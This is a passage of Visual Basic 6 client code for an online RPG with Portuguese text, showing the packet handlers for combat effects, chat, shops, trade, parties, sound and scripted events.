    Else
        CreateActionMsg Message, color, tmpType, X, Y
        If Message = "Esquivou!" Then
            Call PlaySound("Errou.mp3", -1, -1)
        End If
    End If
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleActionMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleBlood(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim X As Long, Y As Long, Sprite As Long, i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    X = buffer.ReadLong
    Y = buffer.ReadLong

    Set buffer = Nothing
    
    ' randomise sprite
    Sprite = Rand(1, BloodCount)
    
    ' make sure tile doesn't already have blood
    For i = 1 To MAX_BYTE
        If Blood(i).X = X And Blood(i).Y = Y Then
            ' already have blood :(
            Exit Sub
        End If
    Next
    
    ' carry on with the set
    BloodIndex = BloodIndex + 1
    If BloodIndex >= MAX_BYTE Then BloodIndex = 1
    
    With Blood(BloodIndex)
        .X = X
        .Y = Y
        .Sprite = Sprite
        .Timer = GetTickCount
        .Alpha = 255
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleBlood", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAnimation(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    AnimationIndex = AnimationIndex + 1
    If AnimationIndex >= MAX_BYTE Then AnimationIndex = 1
    
    With AnimInstance(AnimationIndex)
        .Animation = buffer.ReadLong
        .X = buffer.ReadLong
        .Y = buffer.ReadLong
        .LockType = buffer.ReadByte
        .lockindex = buffer.ReadLong
        .Used(0) = True
        .Used(1) = True
        .Dir = buffer.ReadByte
        .IsLinear = buffer.ReadByte
        .LockToNPC = buffer.ReadByte
        .CastAnim = buffer.ReadByte
    End With
    
    If AnimInstance(AnimationIndex).Animation > 0 Then
        If Animation(AnimInstance(AnimationIndex).Animation).Tremor > 0 Then
            Tremor = GetTickCount + Animation(AnimInstance(AnimationIndex).Animation).Tremor
        End If
        If Animation(AnimInstance(AnimationIndex).Animation).Buraco > 0 Then
            Call FazerBuraco(AnimInstance(AnimationIndex).X, AnimInstance(AnimationIndex).Y, Animation(AnimInstance(AnimationIndex).Animation).Buraco * 32)
        End If
    End If
    
    ' play the sound if we've got one
    PlayMapSound AnimInstance(AnimationIndex).X, AnimInstance(AnimationIndex).Y, SoundEntity.seAnimation, AnimInstance(AnimationIndex).Animation, AnimInstance(AnimationIndex).CastAnim

    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAnimation", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapNpcVitals(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long
Dim MapNpcNum As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    MapNpcNum = buffer.ReadLong
    For i = 1 To Vitals.Vital_Count - 1
        MapNpc(MapNpcNum).Vital(i) = buffer.ReadLong
    Next
    MapNpc(MapNpcNum).MaxHP = buffer.ReadLong
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapNpcVitals", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCooldown(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Slot As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    Slot = buffer.ReadLong
    SpellCD(Slot) = GetTickCount
    
    If TempPlayer(Index).SpellBufferNum <> 0 Then
        If Spell(TempPlayer(Index).SpellBufferNum).CastPlayerAnim = 1 Then
            TempPlayer(Index).KamehamehaLast = GetTickCount
        End If
    End If
    
    TempPlayer(MyIndex).SpellBuffer = 0
    TempPlayer(MyIndex).SpellBufferTimer = 0
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleCooldown", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleClearSpellBuffer(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer, TheIndex As Long
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    TheIndex = buffer.ReadLong

    TempPlayer(TheIndex).SpellBuffer = 0
    TempPlayer(TheIndex).SpellBufferTimer = 0
    TempPlayer(TheIndex).SpellBufferNum = 0
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleClearSpellBuffer", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSayMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Access As Long
Dim name As String
Dim Message As String
Dim colour As Long
Dim Header As String
Dim PK As Long
Dim saycolour As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    name = buffer.ReadString
    Access = buffer.ReadLong
    PK = buffer.ReadLong
    Message = buffer.ReadString
    Header = buffer.ReadString
    saycolour = buffer.ReadLong
    
    ' Check access level
    If PK = NO Then
        Select Case Access
            Case 0
                colour = White
            Case 1
                colour = DarkGrey
            Case 2
                colour = Cyan
            Case 3
                colour = BrightGreen
            Case 4
                colour = Yellow
        End Select
    Else
        colour = BrightRed
    End If

    AddText Header & name & ": " & Message, colour
        
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSayMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleOpenShop(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim shopnum As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    shopnum = buffer.ReadLong
    
    Set buffer = Nothing
    
    OpenShop shopnum
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleOpenShop", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleResetShopAction(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    ShopAction = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleResetShopAction", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleStunned(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer, TheIndex As Long, TargetTyp As Byte, Duration As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    TheIndex = buffer.ReadLong
    TargetTyp = buffer.ReadByte
    Duration = buffer.ReadLong
    
    If TargetTyp = TARGET_TYPE_NPC Then
        TempMapNpc(TheIndex).StunDuration = Duration
        TempMapNpc(TheIndex).StunTick = GetTickCount
    Else
        TempPlayer(TheIndex).StunDuration = Duration
    End If
    
    If TempPlayer(TheIndex).SpellBuffer > 0 Then
        TempPlayer(TheIndex).SpellBuffer = 0
        TempPlayer(TheIndex).SpellBufferTimer = 0
    End If
    
    Dim i As Long
    For i = 1 To AnimationIndex
        If AnimInstance(i).lockindex = TheIndex And AnimInstance(i).LockType = TARGET_TYPE_PLAYER And AnimInstance(i).CastAnim = 1 Then
            ClearAnimInstance i
        End If
    Next i
    
    For i = 1 To CurrentSound
        If Sounds(i).CastAnim = 1 Then StopSound i
    Next i
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleStunned", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleBank(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    For i = 1 To MAX_BANK
        Bank.Item(i).num = buffer.ReadLong
        Bank.Item(i).value = buffer.ReadLong
    Next
    
    InBank = True
    GUIWindow(GUI_BANK).visible = True
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleBank", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTrade(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    InTrade = buffer.ReadLong
    GUIWindow(GUI_TRADE).visible = True
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTrade", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCloseTrade(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    InTrade = 0
    GUIWindow(GUI_TRADE).visible = False
    TradeStatus = vbNullString
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleCloseTrade", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTradeUpdate(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim dataType As Byte
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    dataType = buffer.ReadByte
    
    If dataType = 0 Then ' ours!
        For i = 1 To MAX_INV
            TradeYourOffer(i).num = buffer.ReadLong
            TradeYourOffer(i).value = buffer.ReadLong
        Next
        YourWorth = buffer.ReadLong & "z"
    ElseIf dataType = 1 Then 'theirs
        For i = 1 To MAX_INV
            TradeTheirOffer(i).num = buffer.ReadLong
            TradeTheirOffer(i).value = buffer.ReadLong
        Next
        TheirWorth = buffer.ReadLong & "z"
    End If
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTradeUpdate", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTradeStatus(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim status As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    status = buffer.ReadByte
    
    Set buffer = Nothing
    
    Select Case status
        Case 0 ' clear
            TradeStatus = vbNullString
        Case 1 ' they've accepted
            TradeStatus = printf("O outro jogador aceitou.")
        Case 2 ' you've accepted
            TradeStatus = printf("Esperando a confirmação do outro jogador.")
    End Select
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTradeStatus", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTarget(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    myTarget = buffer.ReadLong
    myTargetType = buffer.ReadLong
    
    If myTargetType = TARGET_TYPE_NPC Then
        If MapNpc(myTarget).num > 0 Then
        If Npc(MapNpc(myTarget).num).Behaviour = NPC_BEHAVIOUR_SHOPKEEPER And Len(Trim$(Npc(MapNpc(myTarget).num).AttackSay)) > 0 Then
            AddChatBubble myTarget, TARGET_TYPE_NPC, Npc(MapNpc(myTarget).num).AttackSay, Black
        End If
        End If
    End If
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTarget", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleHotbar(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
        
    For i = 1 To MAX_HOTBAR
        Hotbar(i).Slot = buffer.ReadLong
        Hotbar(i).sType = buffer.ReadByte
    Next
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleHotbar", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleHighIndex(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    Player_HighIndex = buffer.ReadLong
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleHighIndex", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSound(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim X As Long, Y As Long, entityType As Long, entityNum As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    X = buffer.ReadLong
    Y = buffer.ReadLong
    entityType = buffer.ReadLong
    entityNum = buffer.ReadLong
    
    PlayMapSound X, Y, entityType, entityNum
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSound", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTradeRequest(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim theName As String
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    theName = buffer.ReadString
    
    Dialogue "Solicitação de troca", theName & " deseja efetuar uma troca com você. Você aceita?", DIALOGUE_TYPE_TRADE, True
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSound", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePartyInvite(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim theName As String
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()

    theName = buffer.ReadString
    
    Dialogue "Convite para grupo", theName & " o chamou para ingressar no grupo. Você aceita?", DIALOGUE_TYPE_PARTY, True
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePartyInvite", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePartyUpdate(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer, i As Long, inParty As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()

    inParty = buffer.ReadByte
    
    ' exit out if we're not in a party
    If inParty = 0 Then
        Call ZeroMemory(ByVal VarPtr(Party), LenB(Party))
        ' exit out early
        Exit Sub
    End If
    
    ' carry on otherwise
    Party.Leader = buffer.ReadLong
    For i = 1 To MAX_PARTY_MEMBERS
        Party.Member(i) = buffer.ReadLong
    Next
    Party.MemberCount = buffer.ReadLong
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePartyUpdate", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePartyVitals(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim playerNum As Long, partyIndex As Long
Dim buffer As clsBuffer, i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    ' which player?
    playerNum = buffer.ReadLong
    ' set vitals
    For i = 1 To Vitals.Vital_Count - 1
        Player(playerNum).MaxVital(i) = buffer.ReadLong
        Player(playerNum).Vital(i) = buffer.ReadLong
    Next
    
    ' find the party number
    For i = 1 To MAX_PARTY_MEMBERS
        If Party.Member(i) = playerNum Then
            partyIndex = i
        End If
    Next
    
    ' exit out if wrong data
    If partyIndex <= 0 Or partyIndex > MAX_PARTY_MEMBERS Then Exit Sub
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePartyVitals", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayBGM(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim str As String

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    str = buffer.ReadString
    
    StopMusic
    PlayMusic str
    
    Set buffer = Nothing
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayBGM", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlaySound(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim str As String

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    str = buffer.ReadString

    PlaySound str, -1, -1
    
    Set buffer = Nothing
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlaySound", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleFadeoutBGM(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim str As String

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    'Need to learn how to fadeout :P
    'do later... way later.. like, after release, maybe never
    StopMusic
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleFadeoutBGM", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleStopSound(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim str As String, i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    For i = 0 To UBound(Sounds()) - 1
        StopSound (i)
    Next
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleFadeoutBGM", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSwitchesAndVariables(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim str As String, i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    For i = 1 To MAX_SWITCHES
        Switches(i) = buffer.ReadString
    Next
    
    For i = 1 To MAX_VARIABLES
        Variables(i) = buffer.ReadString
    Next
    
    Set buffer = Nothing
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSwitchesAndVariables", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleChatBubble(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer, TargetType As Long, Target As Long, Message As String, colour As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    Target = buffer.ReadLong
    TargetType = buffer.ReadLong
    Message = buffer.ReadString
    colour = buffer.ReadLong
    
    AddChatBubble Target, TargetType, Message, colour
    Set buffer = Nothing
Exit Sub
errorhandler:
    HandleError "HandleChatBubble", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpecialEffect(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer, effectType As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    effectType = buffer.ReadLong
    
    Select Case effectType
        Case EFFECT_TYPE_FADEIN
            FadeType = 1
            FadeAmount = 0
        Case EFFECT_TYPE_FADEOUT
            FadeType = 0
            FadeAmount = 255
        Case EFFECT_TYPE_FLASH
            FlashTimer = GetTickCount + 150
        Case EFFECT_TYPE_FOG
            CurrentFog = buffer.ReadLong
            CurrentFogSpeed = buffer.ReadLong
            CurrentFogOpacity = buffer.ReadLong
        Case EFFECT_TYPE_WEATHER
            CurrentWeather = buffer.ReadLong
            CurrentWeatherIntensity = buffer.ReadLong
        Case EFFECT_TYPE_TINT
            CurrentTintR = buffer.ReadLong
            CurrentTintG = buffer.ReadLong
            CurrentTintB = buffer.ReadLong
            CurrentTintA = buffer.ReadLong
    End Select
    Set buffer = Nothing
Exit Sub
errorhandler:
    HandleError "HandleSpecialEffect", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleFlash(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer, Target As Long, n As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    Target = buffer.ReadLong
    n = buffer.ReadByte
    If n = 1 Then
        TempMapNpc(Target).StartFlash = GetTickCount + 200
    Else
        TempPlayer(Target).StartFlash = GetTickCount + 200
    End If
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleFlash", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCreateProjectile(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim AttackerIndex As Long
    Dim TargetIndex As Long
    Dim TargetType As Long
    Dim GrhIndex As Long
    Dim Rotate As Long
    Dim RotateSpeed As Long
    Dim NPCAttack As Byte
    Dim buffer As clsBuffer
    Set buffer = New clsBuffer
    
    Call buffer.WriteBytes(data())

    AttackerIndex = buffer.ReadLong
    TargetIndex = buffer.ReadLong
    TargetType = buffer.ReadLong
    GrhIndex = buffer.ReadLong
    Rotate = buffer.ReadLong
    RotateSpeed = buffer.ReadLong
    NPCAttack = buffer.ReadByte
    
    'Create the projectile
    Call CreateProjectile(AttackerIndex, TargetIndex, TargetType, GrhIndex, Rotate, RotateSpeed, NPCAttack)
    
End Sub

Public Sub Events_HandleEventUpdate(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim d As Long, DCount As Long

    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    CurrentEventIndex = buffer.ReadLong
    With CurrentEvent
        .Type = buffer.ReadLong
        GUIWindow(GUI_EVENTCHAT).visible = Not (.Type = Evt_Quit)
        If (GUIWindow(GUI_CURRENCY).visible = False) Then inChat = Not (.Type = Evt_Quit)
        'Textz
        DCount = buffer.ReadLong
        If DCount > 0 Then
            ReDim .Text(1 To DCount)
            ReDim chatOptState(1 To DCount)
            .HasText = True
            For d = 1 To DCount
                .Text(d) = buffer.ReadString
            Next d
        Else
            Erase .Text
            .HasText = False
            ReDim chatOptState(1 To 1)
        End If
        'Dataz
        DCount = buffer.ReadLong
        If DCount > 0 Then
            ReDim .data(1 To DCount)
            .HasData = True
            For d = 1 To DCount
                .data(d) = buffer.ReadLong
            Next d
            Else
            Erase .data
            .HasData = False
        End If
    End With
    
    Set buffer = Nothing
End Sub

Public Sub Events_HandleEventData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim buffer As clsBuffer
    Dim EIndex As Long, S As Long, SCount As Long, d As Long, DCount As Long

    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    EIndex = buffer.ReadLong
    If EIndex <= 0 Or EIndex > MAX_EVENTS Then Exit Sub
    
    Events(EIndex).name = buffer.ReadString
    Events(EIndex).chkSwitch = buffer.ReadByte
    Events(EIndex).chkVariable = buffer.ReadByte
    Events(EIndex).chkHasItem = buffer.ReadByte
    Events(EIndex).SwitchIndex = buffer.ReadLong
    Events(EIndex).SwitchCompare = buffer.ReadByte
    Events(EIndex).VariableIndex = buffer.ReadLong
    Events(EIndex).VariableCompare = buffer.ReadByte
    Events(EIndex).VariableCondition = buffer.ReadLong
    Events(EIndex).HasItemIndex = buffer.ReadLong
    SCount = buffer.ReadLong
    If SCount > 0 Then
        ReDim Events(EIndex).SubEvents(1 To SCount)
        Events(EIndex).HasSubEvents = True
        For S = 1 To SCount
            With Events(EIndex).SubEvents(S)
                .Type = buffer.ReadLong
                'Textz
                DCount = buffer.ReadLong
                If DCount > 0 Then
                    ReDim .Text(1 To DCount)
                    .HasText = True
                    For d = 1 To DCount
                        .Text(d) = buffer.ReadString
                    Next d
                Else
                    Erase .Text
                    .HasText = False
                End If
                'Dataz
                DCount = buffer.ReadLong
                If DCount > 0 Then
                    ReDim .data(1 To DCount)
                    .HasData = True
                    For d = 1 To DCount
                        .data(d) = buffer.ReadLong
                    Next d
                Else
                    Erase .data
                    .HasData = False
                End If
            End With
        Next S
    Else
        Events(EIndex).HasSubEvents = False
        Erase Events(EIndex).SubEvents
    End If
    
    Events(EIndex).Trigger = buffer.ReadByte
    Events(EIndex).WalkThrought = buffer.ReadByte
    
    Set buffer = Nothing
End Sub

Sub HandleUpdateEffect(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer
Dim EffectSize As Long
Dim EffectData() As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong
    ' Update the Effect
    EffectSize = LenB(Effect(n))
    ReDim EffectData(EffectSize - 1)
    EffectData = buffer.ReadBytes(EffectSize)
    CopyMemory ByVal VarPtr(Effect(n)), ByVal VarPtr(EffectData(0)), EffectSize
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateEffect", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleEffect(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer, X As Long, Y As Long, EffectNum As Long, i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    EffectNum = buffer.ReadLong
    X = buffer.ReadLong
    Y = buffer.ReadLong
